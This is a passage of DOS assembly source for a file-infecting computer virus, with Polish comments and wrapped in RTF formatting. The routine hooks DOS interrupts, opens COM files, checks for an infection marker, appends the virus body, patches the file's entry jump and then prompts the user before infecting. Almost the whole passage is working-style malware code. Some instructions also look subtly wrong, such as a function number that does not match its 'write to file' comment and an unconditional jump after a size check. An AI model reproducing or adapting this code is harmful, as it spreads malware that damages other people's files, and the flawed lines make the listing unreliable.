\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    PytanieOInstalacje               ; TAK - odpowiedz ze zainstalowany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jmp   PowrotZInt21                     ; idz do poprzedniego lancucha}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; przerwan}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch InfekcjaPliku:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  es ds ax bx cx dx si di          ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cs:StaryDS, ds                   ; \\ zachowaj adres do nazwy pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cs:StaryDX, dx                   ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,3524h                         ; \\     pobierz stara i ustaw}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ;  \\    nowa procedure obslugi}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cs:Stare24Seg,es                 ;   \\   przerwania krytycznego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cs:Stare24Ofs,bx                 ;    \\  INT 24h w celu ochrony}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ;     \\ przed ewentulanymi bledami}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  cs                               ;     / (np; podczas proby zapisu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ds                               ;    /   na zabezpieczonej przed}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,NoweInt24                     ;   /    zapisem dyskietce, nie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,2524h                         ;  /     zostanie wywolany dialog}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; /      ARIF)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds,cs:StaryDS                    ; DS=wskazuje na nazwe pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,cs:StaryDX                    ; podaj nazwe pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4300h                         ; funkcja DOS - czytaj atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PrzywrocAtrybut                  ; gdy CF=1, to blad, wiec powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cs:Atrybut,cl                    ; wez stary atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4301h                         ; funkcja DOS - zapisz atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,AtrArchive                    ; podaj nowy atrybut : Archive}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PrzywrocAtrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,3D02h                         ; funkcja DOS - otworz plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; do odczytu i zapisu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PrzywrocAtrybut                  ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xchg  ax,bx                            ; przenies uchwyt pliku do BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,5700h                         ; funkcja DOS - wpisz date, czas}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cs:Czas,cx                       ; zachowaj czas pliku na pozniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   dx,VZnacznik                     ; czy plik jest juz zainfekowany ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    ZamknijPlik                      ; TAK - zamknij plik, powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  cs                               ; \\ DS=CS=segment wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ds                               ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,3                             ; ilosc czytanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,StareBajty                    ; podaj dokad czytac 3 bajty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,3Fh                           ; funkcja DOS - czytaj z pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [StareBajty]         ; wez dwa pierwsze bajty pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,'MZ'                          ; i sprawdz, czy to nie EXE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    ZamknijPlik                      ; gdy "MZ", to plik EXE, powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,'ZM'                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    ZamknijPlik                      ; gdy "ZM", to plik EXE, powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   cx,cx                            ; \\ zeruj CX:DX zawierajace}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   dx,dx                            ; / adres wzgledem konca pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4202h                         ; funkcja DOS - zmien wskaznik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; odczytu/zapisu na koniec pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; DX=starsza czesc dlugosci pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     or    dx,dx                            ; czy plik krotszy niz 65536 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jnz   ZamknijPlik                      ; nie - nie infekuj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,64000                         ; czy dlugosc <= 64000 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jmp   ZamknijPlik                      ; nie - nie infekuj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,3                             ; czy dlugosc >= 3 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jb    ZamknijPlik                      ; nie - nie infekuj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub   ax,3                             ; odejmij dlugosc skoku E9 ?? ??}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   word ptr [Skok+1],ax             ; zapisz do bufora rozkaz skoku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   di,TeZnalazlemPlik               ; \\       zapytaj uzytkownika}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Druk                             ;  \\      czy chce zainfekowac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ;   \\     plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   di,cs:StaryDX                    ;    \\    (nazwa pliku jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds,cs:StaryDS                    ;     \\    wyswietlana)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Druk                             ;      \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ;       - (dzieki temu uzytkownik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  cs                               ;      /   ma pelna kontrole nad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ds                               ;     /    tym, co wirus infekuje)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   di,TeInfekcja                    ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Druk                             ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Decyzja                          ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; /       gdy CF=1, uzytkownik nie pozwala}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,DlugoscWirusa                 ; ilosc zapisywanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,100h                          ; podaj skad zapisac wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,30h                           ; funkcja DOS - zapisz do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   cx,cx                            ; \\ zeruj CX:DX zawierajace}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   dx,dx                            ; / adres wzgledem poczatku pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4200h                         ; funkcja DOS - zmien wskaznik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; odczytu/zapisu na poczatek pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,3                             ; ilosc zapisywanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,Skok                          ; podaj skad zapisac rozkaz skoku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,30h                           ; funkcja DOS - zapisz do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,Czas                          ; przywroc czas}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,VZnacznik                     ; zaznacz w dacie infekcje pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,5701h                         ; funkcja DOS - wpisz date, czas}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZamknijPlik:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,3Eh                           ; funkcja DOS - zamknij plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrzywrocAtrybut:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cl,cs:Atrybut                    ; podaj stary atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ch,0                             ; CX=CL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,cs:StaryDX                    ; podaj nazwe pliku do zmiany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds,cs:StaryDS                    ; w DS:DX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4301h                         ; funkcja DOS - zmien atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lds   dx,dword ptr cs:Stare24Ofs       ; \\  przywroc stare przerwanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,2524h                         ;  - INT 24}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   di si dx cx bx ax ds es          ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PowrotZInt21:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     db 0EAh                                ; mnemonik rozkazu skoku JMP FAR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Stare21Ofs dw ?                        ; (z tych pol korzysta skok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Stare21Seg dw ?                        ; aby oddac sterowanie do poprzedniego}{\f2\fs24\lang1045{\*\listtag0}\par}
